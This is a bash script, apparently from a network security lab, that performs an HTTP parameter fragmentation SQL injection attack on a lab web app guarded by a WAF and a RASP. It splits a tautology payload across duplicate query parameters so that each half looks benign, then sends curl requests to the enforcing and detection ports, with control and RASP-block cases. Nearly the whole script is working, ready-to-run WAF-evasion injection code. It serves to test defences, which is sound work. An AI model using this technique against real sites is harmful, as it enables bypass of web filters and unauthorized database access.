#!/bin/bash
# run_fragmentation.sh — HTTP parameter fragmentation (HPF) SQLi attack.
# One payload split across two duplicate ?q= params (each half benign to the
# WAF); the app's ?split=on sink rejoins them ("".join(getlist("q"))) into one
# injectable term that lands in the vulnerable, RASP-guarded concat sink.
# Read the result from the shared logs on the host:
#
#     tail -f shared/waf_audit.log shared/db_query.log shared/rasp_audit.log
#
# Proxy ports: :80 ENFORCING (may 403 the request) · :8080 DETECTION (forwards,
# so the rejoined query runs). HPF asks whether the split halves slip past :80.
#
# Usage:
#   kathara exec attacker -- /scripts/run_fragmentation.sh
#   kathara exec attacker -- /scripts/run_fragmentation.sh http://172.30.0.10 http://172.30.0.10:8080
set -u

ENFORCE="${1:-http://172.30.0.10}"        # :80  enforcing WAF
DETECT="${2:-http://172.30.0.10:8080}"    # :8080 detection-only

# Payload = zzz%' OR '1'='1'-- - , split so neither half is the whole thing:
FRAG1="zzz%' OR '1'='"
FRAG2="1'-- -"

rows(){ curl -s -G "$1/search" "${@:2}" | grep -c '/records/'; }
code(){ curl -s -G "$1/search" "${@:2}" -o /dev/null -w '%{http_code}'; }

echo "[hpf] fragments: ${FRAG1}  ||  ${FRAG2}"
echo "[hpf] 1. each half alone at :80 WAF : HTTP $(code "$ENFORCE" --data-urlencode "q=$FRAG1") / $(code "$ENFORCE" --data-urlencode "q=$FRAG2")"
echo "[hpf] 2. fragmented split=on at :80 : HTTP $(code "$ENFORCE" --data-urlencode split=on --data-urlencode "q=$FRAG1" --data-urlencode "q=$FRAG2")  (200=slipped, 403=caught; see waf_audit.log)"
echo "[hpf] 3. fragmented split=on at :8080: rows $(rows "$DETECT" --data-urlencode split=on --data-urlencode "q=$FRAG1" --data-urlencode "q=$FRAG2")  (rejoined -> injects)"
echo "[hpf] 4. control split OFF at :8080  : rows $(rows "$DETECT" --data-urlencode "q=$FRAG1" --data-urlencode "q=$FRAG2")  (0 = nothing rejoined)"
echo "[hpf] 5. fragmented + rasp=block     : HTTP $(code "$DETECT" --data-urlencode split=on --data-urlencode "q=$FRAG1" --data-urlencode "q=$FRAG2" --data-urlencode rasp=block)  (403 = RASP backstop)"
